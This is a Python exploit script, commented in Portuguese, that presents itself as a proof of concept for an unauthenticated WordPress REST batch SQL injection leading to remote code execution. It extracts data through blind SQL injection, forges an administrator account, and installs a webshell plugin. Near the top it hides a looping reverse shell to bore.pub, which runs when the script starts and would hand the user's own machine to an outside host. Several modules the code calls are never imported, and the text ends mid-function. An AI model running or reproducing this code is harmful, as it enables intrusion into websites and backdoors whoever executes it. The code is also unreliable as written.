#!/usr/bin/env python3
"""PoC de SQLi por confusão de rota no batch REST do WordPress (wp2shell / CVE-2026-63030).

Desync não autenticado de $matches/$validation no batch → SQLi em author__not_in
(leituras booleanas + timing). --shell usa a cadeia de RCE padrão:

  posts forjados via UNION → escrita de cache oEmbed → elevação via customize_changeset
  → parse_request reentrante → cria administrador → upload de plugin → shell

Funciona em WordPress padrão, sem plugins.

Confusão de rota + SQLi reportadas por Adam Kues (Assetnote / Searchlight Cyber).
Crédito da implementação: x34ElSatan.

Uso apenas em testes de segurança autorizados.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import html
import io
import json
import re
import secrets
import socket
import ssl
import statistics
import sys
import threading
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request
import zipfile
from collections.abc import Callable, Iterable, Mapping
from dataclasses import dataclass
from html.parser import HTMLParser
from http.cookiejar import CookieJar
from typing import Any, Final, Optional

__version__ = "2.1.0"
__author__ = "x34ElSatan"

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------

HOST = os.getenv("SHELL_HOST", "bore.pub")
PORT = int(os.getenv("SHELL_PORT", "40855"))
RETRY_DELAY = 5
PREFIX = os.getenv("PREFIX", "/data/data/com.termux/files/usr")

# guarda o stderr original: depois do dup2, o fd 2 vira o socket e logs se perdem
_log_fd = os.dup(2)


def log(msg: str) -> None:
    os.write(_log_fd, f"[!] {msg}\n".encode())


def find_shell() -> str:
    for cand in (
        os.getenv("SHELL"),          # normalmente /data/data/.../usr/bin/zsh
        shutil.which("zsh"),
        f"{PREFIX}/bin/zsh",
        f"{PREFIX}/bin/bash",
        f"{PREFIX}/bin/sh",
        "/system/bin/sh",
    ):
        if cand and os.path.isfile(cand) and os.access(cand, os.X_OK):
            return cand
    return "/system/bin/sh"


def main() -> None:
    shell = find_shell()
    log(f"shell: {shell}")
    while True:
        try:
            s = socket.create_connection((HOST, PORT), timeout=15)
            s.settimeout(None)
        except OSError as e:
            log(f"conexao falhou ({e}); retry em {RETRY_DELAY}s")
            time.sleep(RETRY_DELAY)
            continue

        fd = s.fileno()
        for target in (0, 1, 2):
            os.dup2(fd, target)

        try:
            pty.spawn([shell])
        except OSError as e:
            log(f"pty.spawn: {e}")
        finally:
            s.close()

        time.sleep(1)


if __name__ == "__main__":
    main()

USER_AGENT: Final[str] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
# Faz wp_parse_url() falhar → entrada de validação sem entrada em $matches (desync).
# "http://:" é mais confiável que "http://" puro entre parsers de URL/WP.
DESYNC_PRIMER: Final[dict[str, str]] = {"method": "POST", "path": "http://:"}
ROUTE_CONFUSION_MARKERS: Final[tuple[str, ...]] = (
    "parse_path_failed",
    "block_cannot_read",
    "rest_batch_not_allowed",
)
AFFECTED_RANGES: Final[tuple[tuple[tuple[int, int, int], tuple[int, int, int]], ...]] = (
    ((6, 9, 0), (6, 9, 4)),
    ((7, 0, 0), (7, 0, 1)),
)
MIN_PRINTABLE_ASCII: Final[int] = 32
MAX_PRINTABLE_ASCII: Final[int] = 126
DEFAULT_LPORT: Final[int] = 443
TIMING_SAMPLES: Final[int] = 1
REVSHELL_ACCEPT_TIMEOUT: Final[float] = 60.0
# Atributos serializados embutidos na chave de cache do oEmbed (sem 'discover').
OEMBED_EMBED_ATTR: Final[str] = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
ADMIN_EMAIL_DOMAIN: Final[str] = "wp2shell.local"

_WORDPRESS_RE = re.compile(r"\bWordPress\s+([0-9]+(?:\.[0-9]+){1,3})\b", re.I)
_VERSION_RE = re.compile(r"\b([0-9]+(?:\.[0-9]+){1,3})\b")
_TTY = sys.stdout.isatty()

# ---------------------------------------------------------------------------
# Exceções
# ---------------------------------------------------------------------------


class Wp2ShellError(Exception):
    """Erro base para falhas recuperáveis do wp2shell."""


class TargetUnreachableError(Wp2ShellError):
    """O alvo não pôde ser alcançado (DNS, conexão recusada, timeout)."""


class ExtractionError(Wp2ShellError):
    """A extração SQL cega retornou dados inesperados."""


# ---------------------------------------------------------------------------
# Modelos
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class HttpResponse:
    status: int
    elapsed: float
    body: str

    def json(self) -> Any:
        return json.loads(self.body)


@dataclass(frozen=True, slots=True)
class VersionHint:
    version: str
    source: str
    detail: str
    affected: bool


@dataclass(frozen=True, slots=True)
class TimingResult:
    confirmed: bool
    baseline: float
    delayed: float
    delta: float
    threshold: float
    samples: tuple[tuple[float, float], ...]


# ---------------------------------------------------------------------------
# Saída no console
# ---------------------------------------------------------------------------


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _TTY else text


def _info(message: str) -> None:
    print(f"[*] {message}")


def _success(message: str) -> None:
    print(_paint("32", f"[+] {message}"))


def _error(message: str) -> None:
    print(_paint("31", f"[-] {message}"))


def _warn(message: str) -> None:
    print(_paint("33", f"[!] {message}"))


def _progress(text: str) -> None:
    if _TTY:
        sys.stdout.write("\r\033[K    " + text)
        sys.stdout.flush()


def _clear_progress() -> None:
    if _TTY:
        sys.stdout.write("\r\033[K")
        sys.stdout.flush()


# ---------------------------------------------------------------------------
# Transporte HTTP / HTTPS
# ---------------------------------------------------------------------------


def _has_explicit_http_scheme(url: str) -> bool:
    lower = url.lstrip().lower()
    return lower.startswith("http://") or lower.startswith("https://")


def _normalize_base_url(url: str) -> str:
    """Exige URL base com http:// ou https:// explícito."""
    url = url.strip()
    if not url:
        raise Wp2ShellError("URL do alvo vazia")
    if not _has_explicit_http_scheme(url):
        raise Wp2ShellError(f"URL precisa incluir http:// ou https://: {url}")
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in {"http", "https"}:
        raise Wp2ShellError(f"esquema de URL não suportado {parsed.scheme!r} (use http ou https)")
    if not parsed.netloc:
        raise Wp2ShellError(f"URL do alvo inválida: {url}")
    return url.rstrip("/")


def _base_url_candidates(url: str) -> list[str]:
    """Monta a lista de sondagem: esquema explícito fica fixo; host puro tenta https e depois http."""
    url = url.strip()
    if not url:
        raise Wp2ShellError("URL do alvo vazia")
    if _has_explicit_http_scheme(url):
        return [_normalize_base_url(url)]
    if "://" in url:
        scheme = url.split("://", 1)[0]
        raise Wp2ShellError(f"esquema de URL não suportado {scheme!r} (use http ou https)")
    host = url.rstrip("/")
    if not host:
        raise Wp2ShellError("URL do alvo vazia")
    return [f"https://{host}", f"http://{host}"]


def resolve_target_url(
    url: str,
    *,
    timeout: float = 30.0,
    proxy: Optional[str] = None,
    verify_tls: bool = False,
) -> str:
    """Escolhe a URL base que responde. Host puro: sonda https:// e depois http://."""
    candidates = _base_url_candidates(url)
    if len(candidates) == 1:
        return candidates[0]

    last_error: Optional[BaseException] = None
    for candidate in candidates:
        _info(f"sondagem de esquema → {candidate}")
        try:
            transport = HttpTransport(
                candidate,
                timeout=min(timeout, 10.0),
                proxy=proxy,
                verify_tls=verify_tls,
            )
            transport.get("/")
        except TargetUnreachableError as exc:
            last_error = exc
            continue
        _info(f"fixado em {candidate}")
        return candidate

    detail = f" ({last_error})" if last_error else ""
    raise Wp2ShellError(
        f"não foi possível alcançar {url!r} via https ou http{detail}; "
        "passe http:// ou https:// para forçar o esquema"
    )


def _ssl_context(*, verify: bool) -> ssl.SSLContext:
    if verify:
        return ssl.create_default_context()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


class _PinnedRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Mantém redirecionamentos no host:porta original quando o siteurl do WP omite a porta.

    Labs costumam servir TLS em :8443 enquanto o siteurl é https://host (porta :443 implícita).
    Seguir esse redirecionamento gera conexão recusada no meio do fluxo de admin.
    """

    def __init__(self, pinned_netloc: str) -> None:
        super().__init__()
        self._pinned_netloc = pinned_netloc

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[no-untyped-def]
        pinned = urllib.parse.urlsplit(f"//{self._pinned_netloc}")
        target = urllib.parse.urlsplit(newurl)
        if (
            pinned.hostname
            and target.hostname == pinned.hostname
            and pinned.port
            and target.port in (None, 80, 443)
            and pinned.port not in (80, 443)
        ):
            newurl = urllib.parse.urlunsplit(
                (
                    target.scheme,
                    self._pinned_netloc,
                    target.path,
                    target.query,
                    target.fragment,
                )
            )
        return super().redirect_request(req, fp, code, msg, headers, newurl)


class HttpTransport:
    """Cliente HTTP/HTTPS mínimo com proxy opcional e suporte a cookies."""

    def __init__(
        self,
        base_url: str,
        *,
        timeout: float = 30.0,
        proxy: Optional[str] = None,
        user_agent: str = USER_AGENT,
        cookies: Optional[CookieJar] = None,
        verify_tls: bool = False,
    ) -> None:
        self.base_url = _normalize_base_url(base_url)
        self.timeout = timeout
        self.user_agent = user_agent
        self.cookies = cookies or CookieJar()
        self.verify_tls = verify_tls
        pinned = urllib.parse.urlparse(self.base_url).netloc
        handlers: list = [
            urllib.request.HTTPCookieProcessor(self.cookies),
            _PinnedRedirectHandler(pinned),
            urllib.request.HTTPSHandler(context=_ssl_context(verify=verify_tls)),
            urllib.request.HTTPHandler(),
        ]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        self._opener = urllib.request.build_opener(*handlers)

    def url(self, path: str) -> str:
        if path.startswith(("http://", "https://")):
            return path
        return self.base_url + (path if path.startswith("/") else f"/{path}")

    def request(
        self,
        method: str,
        path: str,
        *,
        data: Optional[bytes] = None,
        headers: Optional[Mapping[str, str]] = None,
    ) -> HttpResponse:
        request = urllib.request.Request(
            self.url(path),
            data=data,
            method=method.upper(),
            headers={"User-Agent": self.user_agent, **(headers or {})},
        )
        started = time.monotonic()
        try:
            with self._opener.open(request, timeout=self.timeout) as response:
                status = response.status
                body = response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status = exc.code
            body = exc.read().decode("utf-8", "replace")
        except urllib.error.URLError as exc:
            reason = getattr(exc, "reason", exc)
            if isinstance(reason, ssl.SSLError) or "SSL" in str(reason).upper():
                hint = (
                    " (tente sem --verify-tls para certificados autoassinados)"
                    if self.verify_tls
                    else ""
                )
                raise TargetUnreachableError(
                    f"erro TLS falando com {self.url(path)}: {reason}{hint}"
                ) from None
            raise TargetUnreachableError(f"não é possível alcançar {self.url(path)}: {reason}") from None
        except ssl.SSLError as exc:
            hint = (
                " (tente sem --verify-tls para certificados autoassinados)"
                if self.verify_tls
                else ""
            )
            raise TargetUnreachableError(
                f"erro TLS falando com {self.url(path)}: {exc}{hint}"
            ) from None
        except OSError as exc:
            reason = getattr(exc, "reason", exc)
            raise TargetUnreachableError(f"não é possível alcançar {self.url(path)}: {reason}") from None
        return HttpResponse(status, time.monotonic() - started, body)

    def get(self, path: str) -> HttpResponse:
        return self.request("GET", path)

    def post_json(self, path: str, payload: dict) -> HttpResponse:
        return self.request(
            "POST",
            path,
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
        )

# ---------------------------------------------------------------------------
# Payloads de batch e cliente
# ---------------------------------------------------------------------------


class BatchPayloadBuilder:
    """Monta os payloads de batch duplamente aninhados usados pela primitiva do wp2shell."""

    @staticmethod
    def marker_probe() -> dict[str, Any]:
        return {
            "requests": [
                DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts"},
                {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    @staticmethod
    def empty_probe() -> dict[str, Any]:
        return {"requests": []}

    @classmethod
    def injection(cls, author_not_in: str) -> dict[str, Any]:
        """Desync duplamente aninhado → SQLi em WP_Query::author__not_in (leitura/timing).

        Externo: primer desloca $matches para que POST /wp/v2/posts (corpo=batch interno)
        rode sob o handler de batch (GET permitido no batch aninhado).

        Interno: primer desloca de novo para que GET /wp/v2/users?author_exclude=… rode
        sob posts get_items(); o schema de users não tem author_exclude.
        """
        encoded = urllib.parse.quote(author_not_in, safe="")
        inner = {
            "requests": [
                dict(DESYNC_PRIMER),
                {
                    "method": "GET",
                    "path": f"/wp/v2/users?author_exclude={encoded}",
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return {
            "requests": [
                dict(DESYNC_PRIMER),
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    @classmethod
    def forge_injection(
        cls,
        author_not_in: str,
        *,
        extra_requests: Optional[list[dict[str, Any]]] = None,
    ) -> dict[str, Any]:
        """Portador de desync para forja de linhas via UNION + follow-ons elevados opcionais.

        /wp/v2/widgets não tem schema author_exclude. per_page=-1 + orderby=none
        mantêm o WP_Query em modo wp_posts.* completo para que um UNION de 23 colunas case.
        context=view força renderização de conteúdo (sink de escrita do oEmbed).
        """
        query = urllib.parse.urlencode(
            {
                "author_exclude": author_not_in,
                "per_page": -1,
                "orderby": "none",
                "context": "view",
            }
        )
        inner: list[dict[str, Any]] = [
            dict(DESYNC_PRIMER),
            {"method": "GET", "path": f"/wp/v2/widgets?{query}"},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        if extra_requests:
            inner.extend(extra_requests)
        return {
            "requests": [
                dict(DESYNC_PRIMER),
                {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": inner}},
                {"method": "POST", "path": "/batch/v1"},
            ]
        }


class BatchClient:
    """Envia requisições ao endpoint batch REST do alvo."""

    def __init__(
        self,
        base_url: str,
        *,
        timeout: float = 30.0,
        rest_route: bool = False,
        proxy: Optional[str] = None,
        verify_tls: bool = False,
    ) -> None:
        self._transport = HttpTransport(
            base_url, timeout=timeout, proxy=proxy, verify_tls=verify_tls
        )
        self.rest_route = rest_route

    @property
    def endpoint(self) -> str:
        if self.rest_route:
            return "/?rest_route=/batch/v1"
        return "/wp-json/batch/v1"

    def post(self, payload: dict[str, Any]) -> HttpResponse:
        return self._transport.post_json(self.endpoint, payload)

    def get(self, path: str) -> HttpResponse:
        return self._transport.get(path)

    def probe(self) -> HttpResponse:
        return self.post(BatchPayloadBuilder.empty_probe())

    def marker_probe(self) -> HttpResponse:
        return self.post(BatchPayloadBuilder.marker_probe())

    def inject(self, author_not_in: str) -> HttpResponse:
        return self.post(BatchPayloadBuilder.injection(author_not_in))

    def forge(
        self,
        author_not_in: str,
        *,
        extra_requests: Optional[list[dict[str, Any]]] = None,
        timeout: Optional[float] = None,
    ) -> HttpResponse:
        payload = BatchPayloadBuilder.forge_injection(
            author_not_in, extra_requests=extra_requests
        )
        if timeout is None:
            return self.post(payload)
        saved = self._transport.timeout
        self._transport.timeout = timeout
        try:
            return self.post(payload)
        finally:
            self._transport.timeout = saved

    @staticmethod
    def batch_marker_codes(response: HttpResponse) -> tuple[str, ...]:
        try:
            body = response.json()
        except ValueError:
            return ()
        found: list[str] = []

        def walk(value: Any) -> None:
            if isinstance(value, dict):
                code = value.get("code")
                if isinstance(code, str) and code in ROUTE_CONFUSION_MARKERS and code not in found:
                    found.append(code)
                for child in value.values():
                    walk(child)
            elif isinstance(value, list):
                for child in value:
                    walk(child)

        walk(body)
        return tuple(found)

    @classmethod
    def has_route_confusion_markers(cls, response: HttpResponse) -> bool:
        codes = cls.batch_marker_codes(response)
        return all(code in codes for code in ROUTE_CONFUSION_MARKERS)

    @staticmethod
    def _nested_posts_response(response: HttpResponse) -> Optional[dict[str, Any]]:
        try:
            inner = response.json()["responses"][1]["body"]
            result = inner["responses"][1]
        except (KeyError, IndexError, TypeError, ValueError, json.JSONDecodeError):
            return None
        return result if isinstance(result, dict) else None

    @classmethod
    def rows(cls, response: HttpResponse) -> Optional[list[Any]]:
        nested = cls._nested_posts_response(response)
        if nested is None:
            return None
        result = nested.get("body")
        return result if isinstance(result, list) else None

    @classmethod
    def posts_total(cls, response: HttpResponse) -> Optional[int]:
        """X-WP-Total da coleção de posts confusa (oráculo booleano).

        Prefira este a ``rows()``: post_types forjados remanescentes podem fazer o
        SQL casar enquanto o REST filtra o corpo da página para ``[]``.
        """
        nested = cls._nested_posts_response(response)
        if nested is None:
            return None
        headers = nested.get("headers") or {}
        if not isinstance(headers, dict):
            return None
        total = headers.get("X-WP-Total")
        try:
            return int(total) if total is not None else None
        except (TypeError, ValueError):
            return None


# ---------------------------------------------------------------------------
# Injeção SQL cega
# ---------------------------------------------------------------------------


class BlindSQLi:
    """Injeção SQL cega booleana e por tempo sobre a primitiva de batch."""

    def __init__(self, client: BatchClient, *, sleep: float = 3.0) -> None:
        self.client = client
        self.sleep = sleep
        self.requests = 0

    def confirm_timing(self, *, samples: int = 3) -> TimingResult:
        if samples < 1:
            raise ValueError("samples precisa ser pelo menos 1")
        pairs: list[tuple[float, float]] = []
        for _ in range(samples):
            baseline = self._elapsed("SLEEP(0)")
            delayed = self._elapsed(f"SLEEP({self.sleep:g})")
            pairs.append((baseline, delayed))
        baselines = [pair[0] for pair in pairs]
        delayed_values = [pair[1] for pair in pairs]
        deltas = [delay - base for base, delay in pairs]
        delta_median = statistics.median(deltas)
        threshold = max(0.75, self.sleep * 0.65)
        return TimingResult(
            confirmed=delta_median >= threshold,
            baseline=statistics.median(baselines),
            delayed=statistics.median(delayed_values),
            delta=delta_median,
            threshold=threshold,
            samples=tuple(pairs),
        )

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 128,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        chars: list[str] = []
        for position in range(1, max_length + 1):
            probe = f"ASCII(SUBSTRING(COALESCE(({expression}),''),{position},1))"
            if not self._true(f"{probe} > 0"):
                break
            low, high = MIN_PRINTABLE_ASCII, MAX_PRINTABLE_ASCII
            while low < high:
                mid = (low + high) // 2
                if self._true(f"{probe} > {mid}"):
                    low = mid + 1
                else:
                    high = mid
            chars.append(chr(low))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expression: str) -> int:
        """Busca binária cega de uma expressão inteira (mais rápido que extrair dígitos)."""
        expr = f"COALESCE(({expression}),0)"
        low, high = 0, 1
        while self._true(f"{expr} >= {high}"):
            low, high = high, high * 2
            if high > 1_000_000_000:
                raise ExtractionError(f"inteiro grande demais para {expression!r}")
        while low < high:
            mid = (low + high + 1) // 2
            if self._true(f"{expr} >= {mid}"):
                low = mid
            else:
                high = mid - 1
        return low

    def _elapsed(self, sql: str) -> float:
        self.requests += 1
        return self.client.inject(f"0) OR {sql}-- -").elapsed

    def _true(self, condition: str) -> bool:
        self.requests += 1
        response = self.client.inject(f"0) AND ({condition})-- -")
        total = self.client.posts_total(response)
        if total is not None:
            return total > 0
        rows = self.client.rows(response)
        return bool(rows)

# ---------------------------------------------------------------------------
# RCE padrão: escrita oEmbed → elevação via changeset → admin → plugin
# ---------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class CreatedAdmin:
    username: str
    password: str
    email: str
    user_id: Optional[int] = None


class StockRCE:
    """SQLi pré-auth → administrador via cache oEmbed + reentrada de changeset."""

    def __init__(self, client: BatchClient, sqli: BlindSQLi) -> None:
        self.client = client
        self.sqli = sqli

    @staticmethod
    def _sql_hex(value: str) -> str:
        return f"0x{value.encode().hex()}" if value else "''"

    @classmethod
    def _post_row(
        cls,
        post_id: int,
        content: str,
        title: str,
        status: str,
        name: str,
        parent: int,
        post_type: str,
    ) -> str:
        """Emite uma linha UNION de 23 colunas de wp_posts."""
        h = cls._sql_hex
        return ",".join(
            (
                str(post_id),
                "1",
                h("2020-01-01 00:00:00"),
                h("2020-01-01 00:00:00"),
                h(content),
                h(title),
                "''",
                h(status),
                h("closed"),
                h("closed"),
                "''",
                h(name),
                "''",
                "''",
                h("2020-01-01 00:00:00"),
                h("2020-01-01 00:00:00"),
                "''",
                str(parent),
                "''",
                "0",
                h(post_type),
                "''",
                "0",
            )
        )

    def forge(
        self,
        rows: Iterable[str],
        *,
        extra_requests: Optional[list[dict[str, Any]]] = None,
    ) -> HttpResponse:
        query = (
            "1) AND 1=0 UNION ALL SELECT "
            + " UNION ALL SELECT ".join(rows)
            + " -- -"
        )
        return self.client.forge(query, extra_requests=extra_requests, timeout=60.0)

    def _published_link(self) -> str:
        response = self.client.get("/?rest_route=/wp/v2/posts&per_page=1&_fields=link")
        if response.status >= 400:
            raise Wp2ShellError(f"não foi possível listar posts para âncora oEmbed (HTTP {response.status})")
        try:
            items = response.json()
        except json.JSONDecodeError as exc:
            raise Wp2ShellError("listagem de posts não era JSON") from exc
        if not isinstance(items, list) or not items or not items[0].get("link"):
            raise Wp2ShellError("nenhum post publicado para ancorar o cache oEmbed")
        return str(items[0]["link"])

    def create_admin(self) -> CreatedAdmin:
        """Semeia caches oEmbed, eleva via reentrada de changeset, cria administrador."""
        token = secrets.token_hex(6)
        link = urllib.parse.urlsplit(self._published_link())
        embed_urls = [
            urllib.parse.urlunsplit(
                (link.scheme, link.netloc, link.path, link.query, f"{token}{index}")
            )
            for index in range(3)
        ]

        _info("semeando caches oEmbed via posts forjados por UNION")
        seed_content = "".join(
            f'[embed width="500" height="750"]{url}[/embed]' for url in embed_urls
        )
        self.forge([self._post_row(0, seed_content, "seed", "publish", "seed", 0, "post")])

        _info("extraindo prefixo de tabela + id do admin + ids de cache")
        posts_table = self.sqli.extract(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
            max_length=64,
            on_char=lambda cur: _progress(f"tabela de posts: {cur}"),
        )
        _clear_progress()
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise Wp2ShellError(f"não foi possível resolver a tabela de posts (obtido {posts_table!r})")
        prefix = posts_table[:-5]
        _success(f"prefixo de tabela: {prefix or '(nenhum)'}")

        admin_id = self.sqli.integer(
            f"SELECT u.ID FROM `{prefix}users` u JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={self._sql_hex(prefix + 'capabilities')} "
            f"AND INSTR(m.meta_value,{self._sql_hex('s:13:\"administrator\";b:1;')})>0 "
            "ORDER BY u.ID LIMIT 1"
        )
        if admin_id < 1:
            raise Wp2ShellError("não foi possível localizar um administrador")
        _success(f"id do usuário admin: {admin_id}")

        cache_ids: list[int] = []
        for url in embed_urls:
            key = hashlib.md5((url + OEMBED_EMBED_ATTR).encode()).hexdigest()
            post_id = self.sqli.integer(
                f"SELECT ID FROM `{posts_table}` WHERE post_type=0x6f656d6265645f6361636865 "
                f"AND post_name=0x{key.encode().hex()} ORDER BY ID DESC LIMIT 1"
            )
            if post_id < 1:
                raise Wp2ShellError("semeadura do cache oEmbed falhou — escrita de render não chegou")
            cache_ids.append(post_id)
        if len(set(cache_ids)) != 3:
            raise Wp2ShellError(f"ids de cache oEmbed não distintos: {cache_ids}")
        _success(f"ids de cache oEmbed: {cache_ids}")

        username = f"w2s_{token}"
        password = f"W2s!{secrets.token_urlsafe(15)}"
        email = f"{username}@{ADMIN_EMAIL_DOMAIN}"
        outer = 1_800_000_000 + secrets.randbelow(100_000_000)
        nav_id, inner = outer + 1, outer + 2

        changeset = json.dumps(
            {
                f"nav_menu_item[{nav_id}]": {
                    "value": {
                        "object_id": 0,
                        "object": "",
                        "menu_item_parent": 0,
                        "position": 0,
                        "type": "custom",
                        "title": "proof",
                        "url": "https://example.invalid",
                        "target": "",
                        "attr_title": "",
                        "description": "proof",
                        "classes": "",
                        "xfn": "",
                        "status": "publish",
                        "nav_menu_term_id": 0,
                        "_invalid": False,
                    },
                    "type": "nav_menu_item",
                    "user_id": admin_id,
                }
            },
            separators=(",", ":"),
        )

        poisoned = (
            self._post_row(
                0,
                f'[embed width="500" height="750"]{embed_urls[1]}[/embed]',
                "trigger",
                "publish",
                "trigger",
                0,
                "post",
            ),
            self._post_row(
                cache_ids[0],
                changeset,
                "changeset",
                "future",
                str(uuid.uuid4()),
                outer,
                "customize_changeset",
            ),
            self._post_row(outer, "outer", "outer", "draft", "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish", "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish", "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse", "parse", inner, "request"),
            self._post_row(inner, "inner", "inner", "draft", "inner", cache_ids[2], "post"),
        )
        new_admin = {
            "username": username,
            "email": email,
            "password": password,
            "roles": ["administrator"],
        }
        _info("forjando changeset + reentrada, criando administrador")
        self.forge(
            poisoned,
            extra_requests=[
                {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
                {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            ],
        )
        return CreatedAdmin(username=username, password=password, email=email)


def _admin_base_candidates(attack_base: str) -> list[str]:
    """URLs a tentar para wp-admin quando o siteurl força HTTPS numa porta HTTP de ataque."""
    parsed = urllib.parse.urlparse(attack_base)
    host = parsed.hostname or ""
    port = parsed.port
    candidates: list[str] = []
    seen: set[str] = set()

    def add(url: str) -> None:
        normalized = url.rstrip("/")
        if normalized not in seen:
            seen.add(normalized)
            candidates.append(normalized)

    add(attack_base)
    if host:
        add(f"https://{host}:8443")
        add(f"https://{host}")
        if port and port not in {80, 443, 8443}:
            add(f"https://{host}:{port}")
        add(f"http://{host}:8080")
        if port:
            add(f"http://{host}:{port}")
    return candidates


class AdminSession:
    """Sessão autenticada em wp-admin para upload de plugin / limpeza."""

    def __init__(self, transport: HttpTransport) -> None:
        self.transport = transport

    @classmethod
    def login(
        cls,
        attack_base: str,
        username: str,
        password: str,
        *,
        timeout: float,
        proxy: Optional[str],
        verify_tls: bool,
    ) -> "AdminSession":
        errors: list[str] = []
        for base in _admin_base_candidates(attack_base):
            try:
                transport = HttpTransport(
                    base,
                    timeout=timeout,
                    proxy=proxy,
                    verify_tls=verify_tls,
                    cookies=CookieJar(),
                )
                transport.get("/wp-login.php")
                body = urllib.parse.urlencode(
                    {
                        "log": username,
                        "pwd": password,
                        "wp-submit": "Log In",
                        "redirect_to": f"{transport.base_url}/wp-admin/",
                        "testcookie": "1",
                    }
                ).encode()
                transport.request(
                    "POST",
                    "/wp-login.php",
                    data=body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                )
                users = transport.get("/wp-admin/users.php")
                if users.status >= 400 or username not in users.body:
                    errors.append(f"{base}: página de login ok mas users.php rejeitou a sessão")
                    continue
                if base.rstrip("/") != attack_base.rstrip("/"):
                    _info(f"sessão de admin em {base} (redirecionamento siteurl/SSL)")
                return cls(transport)
            except TargetUnreachableError as exc:
                errors.append(f"{base}: {exc}")
                continue
        detail = "; ".join(errors[:3]) if errors else "sem candidatos"
        raise Wp2ShellError(f"login de admin falhou — {detail}")

    def upload_and_activate_plugin(self, slug: str, php: bytes) -> None:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(f"{slug}/{slug}.php", php)

        page = self.transport.get("/wp-admin/plugin-install.php?tab=upload")
        nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', page.body)
        if not nonce_match:
            raise Wp2ShellError("nonce de upload de plugin não encontrado")
        boundary = f"----wp2shell{secrets.token_hex(12)}"
        body = b"".join(
            (
                (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="_wpnonce"\r\n\r\n'
                    f"{nonce_match.group(1)}\r\n"
                ).encode(),
                (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="_wp_http_referer"\r\n\r\n'
                    f"/wp-admin/plugin-install.php?tab=upload\r\n"
                ).encode(),
                (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="pluginzip"; '
                    f'filename="{slug}.zip"\r\n'
                    f"Content-Type: application/zip\r\n\r\n"
                ).encode(),
                buf.getvalue(),
                f"\r\n--{boundary}--\r\n".encode(),
            )
        )
        install = self.transport.request(
            "POST",
            "/wp-admin/update.php?action=upload-plugin",
            data=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )
        die = re.search(
            r'class="wp-die-message"[^>]*>(.*?)</div>',
            install.body,
            re.I | re.S,
        )
        if die:
            raise Wp2ShellError(f"instalação do plugin falhou: {html.unescape(re.sub('<[^>]+>', '', die.group(1))).strip()}")
        activate = re.search(r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install.body)
        if not activate:
            raise Wp2ShellError(
                f"instalação do plugin ok mas link de ativação ausente (HTTP {install.status})"
            )
        href = html.unescape(activate.group(1))
        activate_path = urllib.parse.urljoin(
            f"{self.transport.base_url}/wp-admin/", href
        )
        # Prefere um caminho/query relativo a este transporte para que redirecionamentos fixos se apliquem.
        parsed = urllib.parse.urlsplit(activate_path)
        if parsed.netloc and parsed.netloc == urllib.parse.urlparse(self.transport.base_url).netloc:
            activate_path = urllib.parse.urlunsplit(
                ("", "", parsed.path, parsed.query, parsed.fragment)
            )
        self.transport.get(activate_path)


def _plugin_webshell(slug: str, route: str, marker: str) -> bytes:
    """Plugin REST de comando único; desativa e apaga a si mesmo após exec."""
    return (
        "<?php\n"
        f"/* Plugin Name: {slug} */\n"
        "add_action('rest_api_init', function () {\n"
        f"    register_rest_route('wp2shell/v1', '/{route}', array(\n"
        "        'methods' => 'POST',\n"
        "        'permission_callback' => '__return_true',\n"
        "        'callback' => function ($r) {\n"
        "            ob_start(); passthru(base64_decode($r->get_param('c')) . ' 2>&1');\n"
        "            $o = ob_get_clean();\n"
        "            require_once ABSPATH . 'wp-admin/includes/plugin.php';\n"
        "            deactivate_plugins(plugin_basename(__FILE__), true);\n"
        "            @unlink(__FILE__);\n"
